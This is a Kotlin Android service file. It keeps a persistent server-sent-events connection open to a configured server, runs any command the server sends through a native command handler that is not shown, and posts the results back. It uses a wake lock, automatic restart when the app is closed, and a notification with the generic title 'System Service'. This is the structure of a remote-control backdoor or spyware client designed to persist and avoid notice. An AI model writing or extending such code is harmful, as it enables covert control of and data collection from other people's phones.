package com.template.app

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.BufferedReader
import java.io.IOException
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit

class ConnectionService : Service() {

    companion object {
        private const val TAG = "ConnectionService"
        private const val CHANNEL_ID = "connection_service_channel"
        private const val NOTIF_ID = 2001

        fun start(context: Context) {
            try {
                val intent = Intent(context, ConnectionService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "start error", e)
            }
        }

        fun stop(context: Context) {
            try {
                context.stopService(Intent(context, ConnectionService::class.java))
            } catch (e: Exception) {}
        }
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var isRunning = false
    private var isConnected = false
    private var currentCall: Call? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var reconnectAttempts = 0
    private val maxReconnectDelay = 30_000L

    private var serverUrl: String = ""
    private var deviceId: String = ""
    private var accessKey: String = ""

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "🔥 Service created")
        createNotificationChannel()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "▶️ Service started")

        try {
            val notif = buildNotification("Menghubungkan...")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ServiceCompat.startForeground(
                    this, NOTIF_ID, notif,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
                )
            } else {
                startForeground(NOTIF_ID, notif)
            }
        } catch (e: Exception) {
            Log.e(TAG, "startForeground error", e)
        }

        if (!isRunning) {
            isRunning = true
            connectSSE()
        }

        return START_STICKY
    }

    // ==========================================
    // ===== CONNECT SSE =====
    // ==========================================
    private fun connectSSE() {
        val prefs = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
        serverUrl = prefs.getString("flutter.serverUrl", "") ?: ""
        deviceId = prefs.getString("flutter.deviceId", "") ?: ""
        accessKey = prefs.getString("flutter.accessKey", "") ?: ""

        if (serverUrl.isEmpty() || deviceId.isEmpty()) {
            Log.e(TAG, "❌ Config missing: serverUrl=$serverUrl, deviceId=$deviceId")
            scheduleReconnect()
            return
        }

        val url = "$serverUrl/api/events/$deviceId"
        Log.d(TAG, "🔌 Connecting SSE to: $url")

        val request = Request.Builder()
            .url(url)
            .header("X-Access-Key", accessKey)
            .header("Accept", "text/event-stream")
            .header("Cache-Control", "no-cache")
            .get()
            .build()

        currentCall = client.newCall(request)
        currentCall?.enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "❌ SSE Failure")
                Log.e(TAG, "   class:   ${e.javaClass.simpleName}")
                Log.e(TAG, "   message: ${e.message}")
                isConnected = false
                updateNotification("Reconnecting...")
                scheduleReconnect()
            }

            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful) {
                    Log.e(TAG, "❌ SSE HTTP ${response.code}")
                    isConnected = false
                    scheduleReconnect()
                    return
                }

                Log.d(TAG, "✅ SSE Connected (HTTP ${response.code})")
                isConnected = true
                reconnectAttempts = 0
                updateNotification("Terhubung")

                try {
                    val body = response.body
                    if (body == null) {
                        Log.e(TAG, "SSE body null")
                        isConnected = false
                        scheduleReconnect()
                        return
                    }

                    val reader = BufferedReader(InputStreamReader(body.byteStream()))
                    var line: String?

                    while (reader.readLine().also { line = it } != null) {
                        val currentLine = line ?: continue

                        if (currentLine.startsWith("data:")) {
                            val data = currentLine.substring(5).trim()
                            if (data.isNotEmpty()) {
                                handleSSEMessage(data)
                            }
                        }
                    }

                    Log.d(TAG, "🔌 SSE stream ended")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ SSE read error: ${e.message}")
                } finally {
                    isConnected = false
                    scheduleReconnect()
                }
            }
        })
    }

    // ==========================================
    // ===== HANDLE SSE MESSAGE =====
    // ==========================================
    private fun handleSSEMessage(data: String) {
        try {
            Log.d(TAG, "📩 SSE: ${data.take(100)}")
            val json = JSONObject(data)
            val type = json.optString("type", "")

            when (type) {
                "welcome" -> Log.d(TAG, "👋 Welcome from server")
                "command" -> handleCommand(json)
            }
        } catch (e: Exception) {
            Log.e(TAG, "SSE parse error", e)
        }
    }

    private fun handleCommand(msg: JSONObject) {
        val cmdId = msg.optString("id", "")
        val command = msg.optString("command", "")
        val extra = msg.optString("extra", "")

        Log.d(TAG, "📨 CMD: $command (id=$cmdId)")

        Thread {
            try {
                val result = NativeCommandHandler.execute(
                    this@ConnectionService,
                    command,
                    extra,
                )
                Log.d(TAG, "✅ Executed: $command")
                sendResponse(cmdId, command, result)
            } catch (e: Exception) {
                Log.e(TAG, "Command error", e)
                val errResult = JSONObject().apply {
                    put("ok", false)
                    put("error", e.message ?: "exception")
                }
                sendResponse(cmdId, command, errResult)
            }
        }.start()
    }

    // ==========================================
    // ===== SEND RESPONSE via HTTP POST =====
    // ==========================================
    private fun sendResponse(cmdId: String, command: String, result: JSONObject) {
        try {
            val url = "$serverUrl/api/post-response/$deviceId"
            val payload = JSONObject().apply {
                put("cmd", command)
                put("data", result)
                put("accessKey", accessKey)
            }

            // ⬇️ FIX: pakai toMediaType() + toRequestBody()
            val mediaType = "application/json; charset=utf-8".toMediaType()
            val requestBody = payload.toString().toRequestBody(mediaType)

            val request = Request.Builder()
                .url(url)
                .header("X-Access-Key", accessKey)
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "❌ Response error: ${e.message}")
                }

                override fun onResponse(call: Call, response: Response) {
                    Log.d(TAG, "📤 Response sent: $command (HTTP ${response.code})")
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Send response error", e)
        }
    }

    private fun scheduleReconnect() {
        if (!isRunning) return
        reconnectAttempts++
        val delay = minOf(
            2000L * (1 shl (reconnectAttempts - 1).coerceAtMost(5)),
            maxReconnectDelay,
        )
        Log.d(TAG, "⏰ Reconnect in ${delay}ms (attempt #$reconnectAttempts)")
        mainHandler.postDelayed({
            if (isRunning) connectSSE()
        }, delay)
    }

    // ==========================================
    // ===== WAKE LOCK =====
    // ==========================================
    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "Orgsapp::SSEWakeLock"
            )
            wakeLock?.acquire(24 * 60 * 60 * 1000L)
            Log.d(TAG, "🔒 WakeLock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock error", e)
        }
    }

    // ==========================================
    // ===== NOTIFICATION =====
    // ==========================================
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                CHANNEL_ID, "Connection Service", NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Menjaga koneksi ke server"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
    }

    private fun buildNotification(status: String): Notification {
        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
        val pendingIntent = if (launchIntent != null) {
            PendingIntent.getActivity(
                this, 0, launchIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
            )
        } else null

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText(status)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun updateNotification(status: String) {
        try {
            getSystemService(NotificationManager::class.java)
                .notify(NOTIF_ID, buildNotification(status))
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        Log.d(TAG, "💀 Service destroyed")
        isRunning = false
        try {
            currentCall?.cancel()
        } catch (e: Exception) {}

        try {
            wakeLock?.release()
            wakeLock = null
        } catch (e: Exception) {}

        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "⚠️ Task removed — restart")
        val restartIntent = Intent(applicationContext, ConnectionService::class.java)
        val restartPending = PendingIntent.getService(
            this, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE,
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 2000,
            restartPending,
        )
    }
}
